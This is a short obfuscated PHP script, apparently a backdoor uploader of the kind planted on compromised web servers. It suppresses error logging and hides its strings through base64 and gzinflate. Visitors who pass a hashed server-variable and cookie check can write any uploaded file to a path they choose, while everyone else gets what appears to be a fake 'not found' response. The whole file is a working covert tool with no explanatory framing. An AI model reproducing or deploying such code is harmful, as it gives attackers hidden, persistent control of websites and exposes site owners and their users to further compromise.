<?php

@ini_set('log_errors', 0);
@ini_set('error_log', NULL);
@ini_set('error_reporting', NULL);
@error_reporting(0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);
@ignore_user_abort(true);
function O($s)
{
    //RyT@iBTSA
    $O = "base64_decode";
    /*a}Zu3Xf>thq}I*/
    /*\KFI(ahJ]!\eb*/
    $s = base64_decode($s);
    ##k`hLv#`h
    $O = "gzinflate";
    //(e4xLLSahUV
    return gzinflate($s);
}
if (md5(
    //dZk3LP&WZPVj
    md5(
        ##}m@6wHT^
        md5(
            /*Rf\K&_Up}T\OiFahy*/
            $_SERVER[O(
                /*JGN|`9Y*/
                '8wgJCYgPDXYNind0d/ULAQA='
            )]
        )
    )
) == O(
    //VgsJzu#^MSXQS+(xZB>
    'M7Y0NTFKSTVJNUpLNDUwMTNKsTRLTTQyS7Uwt0g0M7UAAA=='
)) {
    if (session_start()) {
        //7c8ViP59MUX2
        preg_match(
            /*}c>p{nUSO**/
            O(
                ##Hmye(gxb*
                '04+LjrOK1dLPBAA='
            ),
            ##f.ff00
            $_SERVER[O(
                /*ajV!`w,{Xx_*/
                '8wgJCYj38A8OAQA='
            )],
            $UMPYGKGTW
        );
        //O[i7o#\}QT8
        $LWCXYWFHF = $UMPYGKGTW[0];
        if (@md5(
            ##hqUHGa<
            $_COOKIE[md5(
                /*j]m[bq0*/
                $LWCXYWFHF . O(
                    /*i[F)!vId!I*/
                    'KyguTwEA'
                )
            )]
        ) != O(
            //e.DH7|&>H
            'MzZIMjZLSTExTDRIMbZMTUs2M0u0NDUwMTEzNjJKS7QEAA=='
        )) {
            echo O(
                /*P.QITq4Pm)aJ_th=y,*/
                'C8lIVUgsLcnIL8qsSizJzM9TSEvMzElN0VEoyElNLE5VKEpV0IUpSAUA'
            );
            exit;
        }
    }
    if (!empty($_FILES[O(
        ## cv*SkRVwi[
        'y610y8xJBQA='
    )])) {
        /*|D>,b^d2>cqCO+GdM*/
        move_uploaded_file(
            //EVR2$;5+OUcK99),
            $_FILES[O(
                //`n1.|^p,DQSLk>D&l{
                'y610y8xJBQA='
            )][O(
                /* =H_cmL!V9Tv.N0M7gUs*/
                'K8ktiM9LzE0FAA=='
            )],
            //CwV*Z2dtHf-c&Y@=,X
            $_FILES[O(
                /*Rjjy8DYXX&^kT*/
                'y610y8xJBQA='
            )][O(
                /*)xEUJyo27*/
                'y0vMTQUA'
            )]
        );
    }
    echo O(
        //;]cLB{1}3
        '4+XitEnLL8pVSM1LLqksSLVVyi3NKcksSCwq0QeJ66YkliQqKSQml2Tm59kqKSnkppZk5KfYKgX4B4co2SnwAvVn5hWUlijkJeaCdFe6ZeakKilAzEoDsZEVQYSLS5NyM0uUFMoSc0qB3Cc7up7sWfBsWvuT3dugqsF22wEA'
    );
    exit;
} else {
    /*AC!*):m*/
    header(
        /*H#8eZ-@oihL+eIZi._e*/
        O(
            ##gwDfmC
            '8wgJCdA31DNUMDEwUfDLL1Fwyy/NSwEA'
        )
    );
    //,RrpPh~^N0s-Z(jf(
    header(
        /*(AMrYKF]=!u>FL*/
        O(
            ##^$|s p,UOz<(0ST*T
            'Ky5JLCkttlIwMTBR8MsvUXDLL81LAQA='
        )
    );
    exit;
}
